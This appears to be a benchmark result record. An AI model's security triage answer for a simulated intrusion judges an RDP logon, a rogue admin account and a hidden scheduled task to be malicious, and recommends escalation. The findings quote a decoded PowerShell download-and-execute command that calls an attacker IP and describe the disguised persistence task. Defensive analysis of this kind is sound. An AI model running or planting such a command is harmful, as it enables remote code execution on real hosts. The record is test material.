@@ -1,0 +1,95 @@
+{
+ "scenario_id": "T207",
+ "condition": "C1",
+ "variant": "P2",
+ "backend": "openai:gpt-6-luna",
+ "sample": 0,
+ "attempts": [
+  {
+   "answer": "{\n  \"assessment\": \"malicious\",\n  \"confidence\": 0.97,\n  \"supporting_observations\": [\n    {\n      \"claim\": \"At 13:42 UTC, WS-EBROOKS-01 received an RDP connection from 203.0.113.133, and a type-10 interactive logon for ken.ito was recorded from that same address. This conflicts with the inventory context that remote administration is only performed from WS-KITO-01 and there is no VPN.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T207-00077\", \"T207-00078\", \"T207-00080\"]\n    },\n    {\n      \"claim\": \"The domain controller recorded a Kerberos service ticket for ken.ito to WS-EBROOKS-01 from 203.0.113.133 shortly before the RDP logon.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T207-00075\"]\n    },\n    {\n      \"claim\": \"At 13:47:06, svc_update was created by an event attributed to ken.ito; at 13:47:18, that account was added to the BLUEFIN Administrators group. This is inconsistent with the inventory description of temporary accounts and is direct evidence relating to the alerted account.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T207-00099\", \"T207-00103\"]\n    },\n    {\n      \"claim\": \"At 13:47:20, a scheduled task named Microsoft\\\\Windows\\\\HealthCheck was created on WS-EBROOKS-01 under ken.ito. It runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.133/a.ps1)`, an unusual download-and-execute action.\",\n      \"claim_type\": \"observed_fact\",\n      \"record_ids\": [\"T207-00104\"]\n    },\n    {\n      \"claim\": \"The close timing of the external-source RDP logon, creation and administrator-group assignment of svc_update, and creation of the hidden PowerShell task is consistent with malicious activity involving the alerted account.\",\n      \"claim_type\": \"inferred_claim\",\n      \"record_ids\": [\"T207-00077\", \"T207-00080\", \"T207-00099\", \"T207-00103\", \"T207-00104\"]\n    }\n  ],\n  \"known_telemetry_limitations\": [\n    \"The DC account-management events use logon ID 0xf893ff4, while the workstation's interactive logon uses 0x506c1c2. These are recorded on different hosts, so the supplied records do not directly establish that the RDP session caused the account changes.\",\n    \"The supplied records show scheduled-task creation but not whether the task executed or whether the referenced script was retrieved.\",\n    \"The address 203.0.113.133 is recorded as the source, but the evidence does not identify the person or system behind it or establish its real-world routability.\",\n    \"The evidence does not show whether svc_update was subsequently used or whether there was an authorized change not represented in the supplied context.\"\n  ],\n  \"claims_not_established\": [\n    \"That ken.ito personally performed the account creation or group addition; the logs attribute the events to the account but do not establish the human operator.\",\n    \"That the RDP session and the DC account-management events were the same authenticated session.\",\n    \"That the scheduled task executed successfully or that the remote script was malicious.\",\n    \"The ultimate origin or operator of the recorded source address.\"\n  ],\n  \"recommended_action\": \"escalate\",\n  \"additional_evidence_needed\": [\n    \"Correlate DC logon ID 0xf893ff4 with authentication, source-host, and session records around the 4720 and 4732 events.\",\n    \"Collect endpoint telemetry for WS-EBROOKS-01 covering RDP session provenance, process and command execution, scheduled-task execution, and network activity related to the task.\",\n    \"Review the state, group memberships, authentication history, and subsequent use of svc_update; contain or disable it pending authorization review.\",\n    \"Verify whether any approved change request authorizes creating svc_update, adding it to Administrators, or creating the HealthCheck task.\"\n  ],\n  \"unrelated_findings\": [\n    \"Dropbox Update processes ran on WS-EBROOKS-01; Dropbox is not listed as approved, and the inventory says no other file-sharing or cloud-storage services are approved. Track separately; this observation does not determine the alerted account finding. (T207-00004, T207-00005, T207-00042, T207-00043, T207-00073, T207-00074)\"\n  ]\n}",
+   "valid": true,
+   "errors": [],
+   "usage": {
+    "input": 27497,
+    "output": 2607
+   }
+  }
+ ],
+ "parsed": {
+  "assessment": "malicious",
+  "confidence": 0.97,
+  "supporting_observations": [
+   {
+    "claim": "At 13:42 UTC, WS-EBROOKS-01 received an RDP connection from 203.0.113.133, and a type-10 interactive logon for ken.ito was recorded from that same address. This conflicts with the inventory context that remote administration is only performed from WS-KITO-01 and there is no VPN.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T207-00077",
+     "T207-00078",
+     "T207-00080"
+    ]
+   },
+   {
+    "claim": "The domain controller recorded a Kerberos service ticket for ken.ito to WS-EBROOKS-01 from 203.0.113.133 shortly before the RDP logon.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T207-00075"
+    ]
+   },
+   {
+    "claim": "At 13:47:06, svc_update was created by an event attributed to ken.ito; at 13:47:18, that account was added to the BLUEFIN Administrators group. This is inconsistent with the inventory description of temporary accounts and is direct evidence relating to the alerted account.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T207-00099",
+     "T207-00103"
+    ]
+   },
+   {
+    "claim": "At 13:47:20, a scheduled task named Microsoft\\Windows\\HealthCheck was created on WS-EBROOKS-01 under ken.ito. It runs hidden PowerShell with an encoded command that decodes to `IEX (iwr http://203.0.113.133/a.ps1)`, an unusual download-and-execute action.",
+    "claim_type": "observed_fact",
+    "record_ids": [
+     "T207-00104"
+    ]
+   },
+   {
+    "claim": "The close timing of the external-source RDP logon, creation and administrator-group assignment of svc_update, and creation of the hidden PowerShell task is consistent with malicious activity involving the alerted account.",
+    "claim_type": "inferred_claim",
+    "record_ids": [
+     "T207-00077",
+     "T207-00080",
+     "T207-00099",
+     "T207-00103",
+     "T207-00104"
+    ]
+   }
+  ],
+  "known_telemetry_limitations": [
+   "The DC account-management events use logon ID 0xf893ff4, while the workstation's interactive logon uses 0x506c1c2. These are recorded on different hosts, so the supplied records do not directly establish that the RDP session caused the account changes.",
+   "The supplied records show scheduled-task creation but not whether the task executed or whether the referenced script was retrieved.",
+   "The address 203.0.113.133 is recorded as the source, but the evidence does not identify the person or system behind it or establish its real-world routability.",
+   "The evidence does not show whether svc_update was subsequently used or whether there was an authorized change not represented in the supplied context."
+  ],
+  "claims_not_established": [
+   "That ken.ito personally performed the account creation or group addition; the logs attribute the events to the account but do not establish the human operator.",
+   "That the RDP session and the DC account-management events were the same authenticated session.",
+   "That the scheduled task executed successfully or that the remote script was malicious.",
+   "The ultimate origin or operator of the recorded source address."
+  ],
+  "recommended_action": "escalate",
+  "additional_evidence_needed": [
+   "Correlate DC logon ID 0xf893ff4 with authentication, source-host, and session records around the 4720 and 4732 events.",
+   "Collect endpoint telemetry for WS-EBROOKS-01 covering RDP session provenance, process and command execution, scheduled-task execution, and network activity related to the task.",
+   "Review the state, group memberships, authentication history, and subsequent use of svc_update; contain or disable it pending authorization review.",
+   "Verify whether any approved change request authorizes creating svc_update, adding it to Administrators, or creating the HealthCheck task."
+  ],
+  "unrelated_findings": [
+   "Dropbox Update processes ran on WS-EBROOKS-01; Dropbox is not listed as approved, and the inventory says no other file-sharing or cloud-storage services are approved. Track separately; this observation does not determine the alerted account finding. (T207-00004, T207-00005, T207-00042, T207-00043, T207-00073, T207-00074)"
+  ]
+ },
+ "status": "VALID",
+ "faithfulness_precheck": {
+  "n_cited": 12,
+  "n_missing": 0,
+  "missing": []
+ },
+ "duration_s": 25.8
+}
